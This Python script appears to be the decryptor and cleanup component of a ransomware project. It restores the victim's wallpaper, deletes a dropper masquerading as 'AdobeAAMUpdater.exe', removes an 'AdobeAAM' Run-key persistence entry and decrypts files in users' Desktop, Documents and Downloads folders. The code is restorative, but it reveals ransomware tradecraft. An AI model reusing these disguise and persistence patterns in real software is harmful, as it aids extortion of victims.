from Decrypt_Func import Decrypt
from Decrypt_Func import s
from os import path,getenv,remove
from os import system as sys
from shutil import copyfile
from winreg import *

if s=='Windows':
	try:
		appdata = getenv('APPDATA')
		dest = appdata+"/Microsoft/Windows/Themes"
		sys('attrib -s -h '+dest+'/.transold')
		copyfile(dest+'/.transold',dest+'/TranscodedWallpaper')
		sys("taskkill /f /im explorer.exe")
		sys("start C:/Windows/explorer.exe")
	except:
		pass

	try:
		remove('C:/Users/Public/AdobeAAMUpdater.exe')
	except:
		pass

	try:
		keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
		key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
		DeleteValue(key,'AdobeAAM')
	except PermissionError:
		try:
			keypath = r'Software\Microsoft\Windows\CurrentVersion\Run'
			key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
			DeleteValue(key,'AdobeAAM')
		except:
			pass

	Decrypt.getkey()

	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')

	Decrypt.d_iterator(desktop)
	Decrypt.d_iterator(downloads)
	Decrypt.d_iterator(documents)

	Decrypt.cureall()

elif s=='Linux':
	Decrypt.getkey()

	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')
	area = path.expanduser('~/Área de trabalho')
	documentos = path.expanduser('~/Documentos')

	Decrypt.d_iterator(desktop)
	Decrypt.d_iterator(downloads)
	Decrypt.d_iterator(documents)
	Decrypt.d_iterator(area)
	Decrypt.d_iterator(documentos)

	Decrypt.cureall()
